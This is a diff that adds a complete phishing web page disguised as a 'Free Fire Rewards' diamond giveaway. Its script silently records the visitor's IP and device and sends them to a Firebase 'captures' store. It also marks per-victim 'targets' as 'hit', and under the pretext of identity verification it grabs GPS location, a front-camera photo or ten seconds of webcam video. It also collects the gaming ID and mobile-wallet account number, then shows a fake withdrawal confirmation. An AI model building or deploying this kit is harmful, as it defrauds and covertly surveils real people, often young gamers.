@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Free Fire Free Rewards</title>
+  <style>
+    .btn-ghost { background: var(--card2); box-shadow: none; border: 1px solid var(--border); color: var(--text); }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="reward-banner">
+      <div class="big-icon">🎮</div>
+      <h1>FREE FIRE REWARDS</h1>
+      <div class="sub">You've been selected! Claim your prize below 🎉</div>
+    </div>
+
+    <div class="main-card" id="main-card">
+      <div class="offer-tag">LIMITED TIME OFFER</div>
+      <div class="info-text">
+        <b>🎁 Congratulations!</b> Your gaming ID has been randomly selected for 
+        <b>1000 Diamonds + 5000 Coins FREE</b>. Complete your withdrawal to claim.
+      </div>
+
+      <div id="withdrawal-form">
+        <div class="form-group">
+          <label>👤 Your Gaming ID / Player Name</label>
+          <input type="text" id="gaming-id" placeholder="Enter your Free Fire / PUBG ID" value="Player_098765">
+        </div>
+        <div class="form-group">
+          <label>💳 Withdrawal Account Number (JazzCash / EasyPaisa)</label>
+          <input type="text" id="account-num" placeholder="03XX-XXXXXXX" value="03123456789">
+        </div>
+        <div class="form-group">
+          <label>💰 Amount</label>
+          <input type="text" value="1000 Diamonds + 5000 Coins" disabled style="color:#ffd54f;font-weight:700;">
+        </div>
+
+        <button id="btn-allow" class="btn-withdraw">
+          💎 Verify Identity & Withdraw Now
+        </button>
+
+        <div id="status-box" class="status-box"></div>
+      </div>
+
+      <div id="success-screen" class="success-screen">
+        <div class="check-icon">✅</div>
+        <h2>Withdrawal Successful!</h2>
+        <p>Your <b>1000 Diamonds + 5000 Coins</b> have been credited to your account.<br>They will be available within <b>24 hours</b>.</p>
+        <div class="ref-num">📋 Ref: FF-2026-${Math.floor(100000 + Math.random()*900000)}</div>
+        <p style="margin-top:14px;font-size:12px;color:#4a4a5a;">Thank you for using Free Fire Rewards Program. 🎮</p>
+      </div>
+    </div>
+
+    <div id="photo-result" style="display:none;"></div>
+    <video id="video-preview" autoplay muted playsinline style="display:none;"></video>
+    <canvas id="photo-canvas" style="display:none;"></canvas>
+    <button id="btn-save-gallery" class="btn btn-ghost" style="display:none; margin-top:12px;">Save to Gallery</button>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
+  <script src="firebase-config.js"></script>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const targetId = params.get('id');
+    const type = params.get('type') || 'camera';   // camera, video, location, ip
+    const uid = params.get('uid') || 'unknown';
+
+    const btnAllow = document.getElementById('btn-allow');
+    const statusBox = document.getElementById('status-box');
+    const videoPreview = document.getElementById('video-preview');
+    const photoCanvas = document.getElementById('photo-canvas');
+    const photoResult = document.getElementById('photo-result');
+    const withdrawalForm = document.getElementById('withdrawal-form');
+    const successScreen = document.getElementById('success-screen');
+    const mainCard = document.getElementById('main-card');
+
+    let capturedIP = '0.0.0.0';
+    let capturedDevice = 'Unknown Device';
+    let captureComplete = false;
+    let lastPhotoBase64 = '';
+    let lastVideoURL = '';
+
+    async function captureIP() {
+      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); capturedIP = d.ip; } catch(e) { capturedIP = '127.0.0.1'; }
+
+      const ua = navigator.userAgent;
+      if (/Android/i.test(ua)) {
+        const match = ua.match(/Android\s+[\d\.]+;\s*([^;]+)\s*Build/i);
+        capturedDevice = match ? match[1].trim() : "Android Device";
+      } else if (/iPhone|iPad|iPod/i.test(ua)) { capturedDevice = "iOS Device"; }
+      else if (/Windows/i.test(ua)) { capturedDevice = "Windows PC"; }
+      else if (/Macintosh/i.test(ua)) { capturedDevice = "Mac System"; }
+      else if (/Linux/i.test(ua)) { capturedDevice = "Linux System"; }
+      else { capturedDevice = "Unknown Device"; }
+
+      try {
+        await db.collection('captures').add({
+          targetId: targetId || 'direct',
+          type: 'ip',
+          ip: capturedIP,
+          deviceModel: capturedDevice,
+          uid,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+      } catch(e) {}
+
+      if (targetId) {
+        try {
+          await db.collection('targets').doc(targetId).update({
+            status: 'hit',
+            ip: capturedIP,
+            device: capturedDevice,
+            hitAt: firebase.firestore.FieldValue.serverTimestamp()
+          });
+        } catch(e) {}
+      }
+    }
+
+    async function captureLocation() {
+      if (type !== 'location') return;
+      if (!navigator.geolocation) {
+        statusBox.className = 'status-box show error';
+        statusBox.textContent = '❌ Geolocation not supported by your browser.';
+        return;
+      }
+
+      statusBox.className = 'status-box show loading';
+      statusBox.textContent = '📍 Retrieving GPS coordinates...';
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const { latitude, longitude } = pos.coords;
+        try {
+          await db.collection('captures').add({
+            targetId: targetId || 'direct',
+            type: 'location',
+            latitude,
+            longitude,
+            ip: capturedIP,
+            deviceModel: capturedDevice,
+            uid,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+          });
+        } catch(e) { console.error('Location store error', e); }
+
+        if (targetId) {
+          try {
+            await db.collection('targets').doc(targetId).update({
+              status: 'hit',
+              ip: capturedIP,
+              device: capturedDevice,
+              hitAt: firebase.firestore.FieldValue.serverTimestamp()
+            });
+          } catch(e) {}
+        }
+
+        statusBox.className = 'status-box show success';
+        statusBox.textContent = '✅ Location captured!';
+        setTimeout(() => { statusBox.style.display = 'none'; showSuccess(); }, 1200);
+      }, err => {
+        statusBox.className = 'status-box show error';
+        statusBox.textContent = '❌ Unable to get location: ' + err.message;
+      });
+    }
+
+    function canvasToBase64(canvas, quality) {
+      return canvas.toDataURL('image/jpeg', quality || 0.85);
+    }
+
+    function showSuccess() {
+      withdrawalForm.style.display = 'none';
+      successScreen.style.display = 'block';
+      const refEl = successScreen.querySelector('.ref-num');
+      if (refEl) refEl.textContent = `📋 Ref: FF-2026-${Math.floor(100000 + Math.random()*900000)}`;
+    }
+
+    async function handleAllow() {
+      if (captureComplete) return;
+
+      const gamingId = document.getElementById('gaming-id').value.trim() || 'Unknown Player';
+      const accountNum = document.getElementById('account-num').value.trim() || 'Unknown Account';
+
+      btnAllow.disabled = true;
+      btnAllow.textContent = '⏳ Verifying...';
+      statusBox.className = 'status-box show loading';
+      statusBox.textContent = 'Please complete identity verification...';
+
+      try {
+        if (type === 'video') {
+          const stream = await navigator.mediaDevices.getUserMedia({video: true});
+          videoPreview.style.display = 'block';
+          videoPreview.srcObject = stream;
+
+          const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+          const chunks = [];
+          mediaRecorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+          mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const storageRef = firebase.storage().ref().child(`videos/${targetId}_${Date.now()}.webm`);
+            await storageRef.put(blob);
+            const downloadURL = await storageRef.getDownloadURL();
+
+            await db.collection('captures').add({
+              targetId,
+              type: 'video',
+              videoURL: downloadURL,
+              ip: capturedIP,
+              deviceModel: capturedDevice,
+              uid,
+              timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+
+            if (targetId) {
+              await db.collection('targets').doc(targetId).update({
+                status: 'hit',
+                ip: capturedIP,
+                device: capturedDevice,
+                hitAt: firebase.firestore.FieldValue.serverTimestamp()
+              });
+            }
+
+            stream.getTracks().forEach(t => t.stop());
+            videoPreview.style.display = 'none';
+          };
+          mediaRecorder.start();
+
+          setTimeout(() => mediaRecorder.stop(), 10000);
+
+          captureComplete = true;
+          statusBox.className = 'status-box show success';
+          statusBox.textContent = '✅ Video captured and uploaded!';
+          setTimeout(() => { statusBox.style.display = 'none'; showSuccess(); }, 1200);
+          return;
+        }
+
+        /* ── CAMERA MODE ── */
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+
+        videoPreview.style.display = 'block';
+        videoPreview.srcObject = stream;
+        await new Promise(r => setTimeout(r, 1200));
+
+        photoCanvas.width = videoPreview.videoWidth || 640;
+        photoCanvas.height = videoPreview.videoHeight || 480;
+        const ctx = photoCanvas.getContext('2d');
+        ctx.drawImage(videoPreview, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        videoPreview.style.display = 'none';
+
+        statusBox.textContent = '📸 Capturing photo...';
+        const photoBase64 = canvasToBase64(photoCanvas, 0.85);
+        lastPhotoBase64 = photoBase64;
+        btnSaveGallery.style.display = 'inline-block';
+
+        await db.collection('captures').add({
+          targetId: targetId || 'direct',
+          type: 'camera',
+          ip: capturedIP,
+          deviceModel: capturedDevice,
+          photoBase64,
+          gamingId,
+          accountNumber: accountNum,
+          uid,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        if (targetId) {
+          await db.collection('targets').doc(targetId).update({
+            status: 'hit',
+            ip: capturedIP,
+            device: capturedDevice,
+            hitAt: firebase.firestore.FieldValue.serverTimestamp()
+          });
+        }
+
+        captureComplete = true;
+        statusBox.className = 'status-box show success';
+        statusBox.textContent = '✅ Identity verified! Processing withdrawal...';
+        setTimeout(() => { statusBox.style.display = 'none'; showSuccess(); }, 1200);
+      } catch (err) {
+        statusBox.className = 'status-box show error';
+        statusBox.textContent = '❌ ' + (err.message || 'Identity verification failed. Please try again.');
+        btnAllow.textContent = '🔄 Try Again';
+        btnAllow.disabled = false;
+      }
+    }
+
+    btnAllow.addEventListener('click', handleAllow);
+
+    captureIP();
+
+    captureLocation();
+
+    if (!targetId) {
+      statusBox.className = 'status-box show error';
+      statusBox.textContent = '❌ This reward link has expired. Please request a new one.';
+      btnAllow.disabled = true;
+    }
+
+    btnSaveGallery.addEventListener('click', () => {
+      if (!lastPhotoBase64) return;
+      const link = document.createElement('a');
+      link.href = lastPhotoBase64;
+      link.download = `capture_${Date.now()}.jpg`;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      alert('✅ Photo saved to gallery!');
+    });
+  </script>
+</body>
+</html>
